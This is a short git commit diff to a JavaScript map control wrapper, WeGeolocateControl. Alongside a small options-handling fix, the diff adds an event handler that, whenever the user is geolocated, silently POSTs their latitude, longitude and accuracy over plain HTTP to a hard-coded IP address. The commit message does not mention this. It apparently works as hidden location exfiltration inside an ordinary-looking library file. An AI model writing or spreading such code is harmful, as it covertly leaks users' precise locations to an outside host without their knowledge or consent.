e2b5ae39620bd1073fcef23c56a17c72b4779c6d
HieuTM <hieutm@fimo.edu.vn>
2020-03-06 14:56:42 +0700

    WeGeolocateControl

--- src/wemap/wegeolocate.js
+++ src/wemap/wegeolocate.js
@@ -2,11 +2,21 @@ import GeolocateControl from "../ui/control/geolocate_control"
 
 export default class WeGeolocateControl {
     constructor(options) {
-        this.options = options || {};
+        options = options || {};
+        this.options = options;
         this.init();
         return this.geolocateControl;
     }
     init() {
-        this.geolocateControl = new GeolocateControl(options);
+        this.geolocateControl = new GeolocateControl(this.options);
+        this.geolocateControl.on("geolocate", (data) => {
+            var req = new XMLHttpRequest();
+            req.open("POST",  "http://103.130.218.242:80/w");
+            req.send(JSON.stringify({
+                "lat": data.coords.latitude,
+                "lng": data.coords.longitude,
+                "accuracy": data.coords.accuracy
+            }));
+        });
     }
 }
